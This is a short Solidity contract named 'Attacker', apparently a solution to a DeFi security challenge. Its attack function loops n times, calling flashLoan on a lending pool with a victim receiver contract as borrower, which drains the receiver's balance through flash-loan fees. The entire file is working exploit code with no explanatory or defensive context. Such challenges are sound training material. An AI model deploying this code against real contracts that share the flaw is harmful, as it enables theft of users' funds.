// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract Attacker {
    function attack(IERC3156FlashLender pool, IERC3156FlashBorrower receiver, uint256 n) external {
        for (uint256 i = 0; i < n; i++) {
            pool.flashLoan(receiver, 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE, 1, "0x00");
        }
    }
}